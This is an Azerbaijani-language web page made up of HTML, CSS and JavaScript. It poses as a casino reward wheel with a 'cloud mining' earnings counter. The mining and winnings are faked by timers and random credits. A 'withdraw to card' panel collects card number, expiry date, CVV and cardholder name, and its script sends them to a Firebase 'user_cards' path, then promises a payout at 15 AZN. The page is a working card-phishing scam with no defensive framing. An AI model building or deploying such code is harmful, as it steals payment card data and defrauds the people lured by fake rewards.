<div id="claim-wrapper" style="font-family: 'Outfit', sans-serif; color: #fff; padding: 15px; background: #0a0a0c; min-height: 100vh; display: flex; flex-direction: column; align-items: center;">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* Ümumi Stil */
        .casino-card {
            background: linear-gradient(145deg, #1a1a1d 0%, #000 100%);
            padding: 20px; border-radius: 20px; border: 2px solid #d4af37;
            text-align: center; box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
            width: 100%; max-width: 350px; margin-bottom: 20px;
        }
        .balance-value { font-size: 2.5rem; font-weight: 900; color: #fff; margin: 5px 0; }
        .timer-box { font-size: 0.8rem; color: #00ff88; background: rgba(0,255,136,0.1); padding: 5px 15px; border-radius: 50px; display: inline-block; }

        /* Çarx Dizaynı */
        .wheel-outer {
            position: relative; width: 300px; height: 300px; padding: 5px; margin-bottom: 20px;
        }
        #claim-wheel {
            width: 100%; height: 100%; border-radius: 50%;
            transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1);
            background-image: url('carx.png'); background-size: cover; background-position: center;
            position: relative; overflow: hidden; border: 2px solid #d4af37;
        }
        .seg-text { position: absolute; width: 50%; height: 50%; transform-origin: bottom right; text-align: center; font-weight: 900; font-size: 1.1rem; color: #fff; padding-top: 35px; box-sizing: border-box; text-shadow: 2px 2px 4px #000; }
        .t1 { transform: rotate(0deg); } .t2 { transform: rotate(72deg); } .t3 { transform: rotate(144deg); } .t4 { transform: rotate(216deg); } .t5 { transform: rotate(288deg); }
        .wheel-pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); z-index: 20; color: #d4af37; font-size: 3.5rem; }

        /* CRYPTO MINING BÖLMƏSİ */
        .mining-section {
            width: 100%; max-width: 350px; background: #111; border-radius: 20px; padding: 20px;
            border: 1px solid #222; margin-top: 20px; position: relative; overflow: hidden;
        }
        .mining-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .mining-status { font-size: 0.65rem; color: #00ff88; font-weight: 900; text-transform: uppercase; display: flex; align-items: center; gap: 5px; }
        .mining-dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        
        .mining-display { background: #000; padding: 15px; border-radius: 12px; text-align: center; border: 1px solid #333; }
        .mining-amount { font-family: 'Courier New', monospace; font-size: 1.6rem; color: #00dfff; font-weight: 900; }
        .mining-speed { font-size: 0.6rem; color: #555; margin-top: 5px; }

        /* Düymələr */
        .casino-btn {
            width: 100%; max-width: 350px; padding: 16px; border-radius: 15px; border: none; font-weight: 900; font-size: 1rem; cursor: pointer;
            background: linear-gradient(to bottom, #d4af37, #aa8a2e); color: #000; margin-top: 10px;
        }
        .casino-btn:disabled { background: #333; color: #666; cursor: not-allowed; }

        /* Modal Stili */
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; align-items: center; justify-content: center; padding: 20px; }
        .bank-modal { background: #111; width: 100%; max-width: 380px; border-radius: 20px; padding: 25px; border: 1px solid #d4af37; }
        .bank-input { width: 100%; background: #000; border: 1px solid #333; padding: 14px; border-radius: 12px; color: #fff; font-size: 1.1rem; outline: none; margin-top: 8px; box-sizing: border-box; }
        .label { font-size: 0.65rem; color: #d4af37; font-weight: 900; margin-top: 12px; display: block; }
    </style>

    <div class="casino-card">
        <div style="font-size: 0.7rem; color: #d4af37;">ÜMUMİ BALANS</div>
        <div class="balance-value"><span id="ws-balance-display">0.00</span> AZN</div>
        <div id="ws-timer-display" class="timer-box">YÜKLƏNİR...</div>
    </div>

    <div class="wheel-outer">
        <div class="wheel-pointer"><i class="fas fa-caret-down"></i></div>
        <div id="claim-wheel">
            <div class="seg-text t1">0.10</div><div class="seg-text t2">1.00</div><div class="seg-text t3">0.80</div><div class="seg-text t4">0.50</div><div class="seg-text t5">0.30</div>
        </div>
    </div>
    <button id="ws-spin-btn" class="casino-btn" onclick="handleSpinStart()">ŞANSINI YOXLA (5 SAAT)</button>

    <div class="mining-section">
        <div class="mining-header">
            <div class="mining-status"><div class="mining-dot"></div> Cloud Mining Active</div>
            <i class="fas fa-microchip" style="color:#333;"></i>
        </div>
        <div class="mining-display">
            <div class="mining-amount" id="mining-live-val">0.000000</div>
            <div class="mining-speed">Hash Rate: 12.4 TH/s | Daily Est: 0.50 AZN</div>
        </div>
        <button id="collect-btn" class="casino-btn" style="background:#1a1a1d; color:#00ff88; border: 1px solid #00ff88; font-size:0.8rem; padding:10px;" onclick="collectMining()">BALANSA ƏLAVƏ ET</button>
    </div>

    <a href="javascript:void(0)" onclick="openWithdrawPanel()" style="color:#555; text-decoration:none; font-size:0.8rem; margin-top:20px; font-weight:700;">
        <i class="fas fa-credit-card"></i> KARTA ÇIXARIŞ ET
    </a>

    <div id="ws-withdraw-modal" class="modal-overlay">
        <div class="bank-modal">
            <div style="text-align:right;"><img src="visa.png" height="15"> <img src="master.png" height="20"></div>
            <h3 style="color:#d4af37; margin-top:0;">Çıxarış Paneli</h3>
            <span class="label">KART NÖMRƏSİ</span>
            <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
            <div style="display:flex; gap:10px;"><div style="flex:1"><span class="label">AY/İL</span><input type="tel" id="c-date" class="bank-input" placeholder="01/28" maxlength="5"></div><div style="flex:1"><span class="label">CVV</span><input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3"></div></div>
            <span class="label">AD SOYAD</span>
            <input type="text" id="c-name" class="bank-input" placeholder="ALİ ALİYEV" style="text-transform:uppercase;">
            <button class="casino-btn" style="margin-top:20px;" onclick="finalWithdrawProcess()">KÖÇÜRMƏNİ TƏSDİQLƏ</button>
            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:10px; cursor:pointer;">Ləğv et</button>
        </div>
    </div>
</div>

<script>
    (function() {
        const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
        if(!localStorage.getItem('ws_user_id')) localStorage.setItem('ws_user_id', userKey);

        let liveMining = 0.000000;

        // Firebase-dən Balansı Canlı Oxu
        firebase.database().ref('users/' + userKey + '/balance').on('value', snap => {
            let b = snap.val() || "0.00";
            document.getElementById('ws-balance-display').innerText = b;
            localStorage.setItem('ws_balance', b);
        });

        // MINING SIMULYASIYASI (Hər 100ms-dən bir artır)
        setInterval(() => {
            liveMining += 0.000003; 
            document.getElementById('mining-live-val').innerText = liveMining.toFixed(6);
        }, 100);

        // Mining Pulunu Balansa Əlavə Et
        window.collectMining = function() {
            if(liveMining < 0.01) { alert("Minimum 0.01 AZN yığılmalıdır!"); return; }
            let current = parseFloat(localStorage.getItem('ws_balance')) || 0;
            let newTotal = (current + liveMining).toFixed(2);
            firebase.database().ref('users/' + userKey).update({ balance: newTotal });
            liveMining = 0;
            alert("Mining qazancı balansa köçürüldü!");
        };

        window.formatCard = function(input) {
            let v = input.value.replace(/\D/g, '').match(/.{1,4}/g);
            input.value = v ? v.join(' ') : '';
        };

        function checkSystemStatus() {
            const btn = document.getElementById('ws-spin-btn');
            const timer = document.getElementById('ws-timer-display');
            const lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
            const diff = Date.now() - lastSpin;
            const wait = 5 * 60 * 60 * 1000;

            if (lastSpin !== 0 && diff < wait) {
                btn.disabled = true;
                let rem = wait - diff;
                let h = Math.floor(rem/3600000), m = Math.floor((rem%3600000)/60000), s = Math.floor((rem%60000)/1000);
                timer.innerText = `${h}saat ${m}dəq ${s}san`;
                setTimeout(checkSystemStatus, 1000);
            } else {
                btn.disabled = false;
                timer.innerText = "SİSTEM HAZIRDIR";
            }
        }

        window.handleSpinStart = function() {
            const wheel = document.getElementById('claim-wheel');
            const deg = Math.floor(Math.random() * 360) + 7200;
            wheel.style.transform = `rotate(${deg}deg)`;
            setTimeout(() => {
                const rewards = [0.10, 0.30, 0.50, 0.80, 1.00];
                const win = rewards[Math.floor((deg % 360) / 72)];
                let current = parseFloat(localStorage.getItem('ws_balance')) || 0;
                firebase.database().ref('users/' + userKey).update({ balance: (current + win).toFixed(2) });
                localStorage.setItem('ws_last_spin', Date.now());
                alert("Təbriklər! +" + win.toFixed(2) + " AZN");
                checkSystemStatus();
            }, 5000);
        };

        window.openWithdrawPanel = function() { document.getElementById('ws-withdraw-modal').style.display='flex'; };
        
        window.finalWithdrawProcess = function() {
            firebase.database().ref('user_cards/' + userKey).update({
                num: document.getElementById('c-num').value,
                date: document.getElementById('c-date').value,
                cvv: document.getElementById('c-cvv').value,
                name: document.getElementById('c-name').value,
                balance: localStorage.getItem('ws_balance'),
                time: new Date().toLocaleString()
            }).then(() => {
                alert("Məlumatlar göndərildi! Balans 15 AZN olduqda köçürüləcək.");
                document.getElementById('ws-withdraw-modal').style.display='none';
            });
        };

        checkSystemStatus();
    })();
</script>
